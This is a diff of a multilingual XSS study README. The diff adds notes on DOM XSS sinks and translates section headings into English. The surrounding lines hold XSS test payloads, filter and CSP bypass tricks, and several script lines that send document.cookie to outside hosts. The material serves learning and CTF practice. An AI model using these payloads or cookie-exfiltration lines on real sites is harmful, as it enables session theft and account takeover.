@@ -8,23 +8,39 @@ Forum or mail board, insert script into the content.
 `<?php echo 'xss, '.$DB_value; ?>`
 
 3. DOM xss: 最近の流行り  
-triggered by DOM operation  
+DOM XSS is different from reflected xss and stored xss. It based on **source** and **sink** which we can run dynamically on the client side.  
+Here are three kinds of common sinks:  
+1. document sink  
+```js
+// get_var = <img src=x onerror=alert(1)>
+document.getElementById('id').innerHTML = get_var;
+```  
+It is important that `<script>alert(1)</script>` doesn't work here because the operation is just a DOM injection.  
 
-Attention: Only reflective stored would interact with server becuase server needs to parse malicious script, but DOM is completedly run in client side.  
-  
+2. location sink  
+```js
+// url = javascript:alert(1)
+document.location = url;
+```  
+
+3. execution sink  
+e.g. `eval`, `setInterval`, `setTimeout`  
+
+Attention: Only reflective stored would interact with server because server needs to parse malicious script, but DOM is completely run in client side.  
+
 *  [XSS detection](#xss-detection)  
 *  [Bypass tricks](#bypass-tricks)  
-*  [htmlspecialchars繞過](#htmlspecialchars-bypass)
-*  [XSS-Auditor介紹與繞過](#xss-auditor-intro-and-bypass)  
-*  [CSP介紹與繞過](#csp-intro-and-bypass)  
-*  [正規表達式](#正規表達式)  
-*  [攻擊手勢](#攻擊手勢)  
+*  [htmlspecialchars bypass](#htmlspecialchars-bypass)
+*  [XSS-Auditor Introduction and bypass](#xss-auditor-intro-and-bypass)  
+*  [CSP Introduction and bypass](#csp-intro-and-bypass)  
+*  [Regular expression](#regular-expression)  
+*  [Some tricks played in CTF](#some-tricks-played-in-ctf)  
 *  [pop-up](#pop-up)  
 *  [Cheatsheet](#cheatsheet)    
 *  [Reference](#reference)
 
 # XSS detection
-I am used to injecting sciprt directly for test, test like following:  
+I am used to injecting script directly for test, test like following:  
 ```js
 <script>alert(/1/);<script>
 <a href=1 onload=alert(1)>hi</a>
@@ -42,7 +58,7 @@ I am used to injecting sciprt directly for test, test like following:
 * Only one time filter  
 ```php
 str_replace('<script>','',$GET['hi'])  // it means script in content will become space
-// <scr<script>ipt> 
+// <scr<script>ipt>
 ```  
 * filter with regex  
 ```php
@@ -55,7 +71,7 @@ preg_replace( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i', '', $_GET['hi'])
   js func: `escape()/unescape()`, `encodeURL()/decodeURL()`, `encodeURLComponent()/decodeURLComponent()`  
   * html encode
   ```php
-  htmlspecialchars($_GET['hi']);  // no open html tag for you 
+  htmlspecialchars($_GET['hi']);  // no open html tag for you
   ```  
   * unicode encode: %u + ASCII(hex) ASP,IIS will automatically parse unicode. `<%s%cr%u0131pt>`  
   * `IBM037`,`IBM500`,`IBM1026`,`cp875` [Bypass RequestValidation on aspx](https://github.com/shinmao/Web-Security-Learning/blob/master/SQL-inj/README.md#bypass-requestvalidation-on-aspx)  
@@ -171,7 +187,7 @@ header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-i
      <script>location.href='http://lorexxar.cn?a+document.cookie'</script>
      <script>windows.open('http://lorexxar.cn?a=+document.cooke')</script>
      <meta http-equiv="refresh" content="5;http://lorexxar.cn?c=[cookie]">
-     // 
+     //
      var x = document.createElement("x");
      x.href='http://xss.com/?cookie='+escape(document.cookie);
      x.click();
@@ -210,7 +226,7 @@ header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-i
   document.write("<scr"+"ipt src='test.com/dependency.js'></scr"+"ipt>");
   ```
   `createElement`時，element還屬於非parser-inserted屬性的，使用`documemt.write`的話就是parser-inserted屬性的了  
-    
+
   :cat2:**Script Gadgets**：  
   [security-research-pocs by Google](https://github.com/google/security-research-pocs/tree/master/script-gadgets)  
   Script Gadget是指一些已存在的js code用來bypass xss mitigations  
@@ -248,7 +264,7 @@ header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-i
 
   若不是框架中帶有的script-gadget，就從開發者的code中自己找一個，以下為思路：  
   某段script中將`attribute`的值插入`innerHTML`;  
-  
+
 以web開發人員的角度推薦幾個工具：  
 1. [CSP Evaluator](https://csp-evaluator.withgoogle.com/)  
 2. [ChromePlugin-CSP Mitigator](https://chrome.google.com/webstore/detail/csp-mitigator/gijlobangojajlbodabkpjpheeeokhfa)  
@@ -260,7 +276,7 @@ header("Content-Security-Policy: default-src 'self'; script-src 'self' 'unsafe-i
 [迅速查表CSP cheatsheet](http://dogewatch.github.io/2016/12/08/By-Pass-CSP/)
 
 
-# 正規表達式
+# Regular expression
 js中會用正規表達式來過濾危險字符  
 ```js
 /g -> 全局匹配
@@ -269,7 +285,7 @@ js中會用正規表達式來過濾危險字符
 參考如下文件：  
 [Documentation](https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Guide/Regular_Expressions#.E9.80.9A.E8.BF.87.E5.8F.82.E6.95.B0.E8.BF.9B.E8.A1.8C.E9.AB.98.E7.BA.A7.E6.90.9C.E7.B4.A2)
 
-# 攻擊手勢  
+# Some tricks played in CTF  
 這裡整理一些攻擊手勢以及比賽中碰到的思路  
 * 不同的`<tag>`做利用  
 ```js
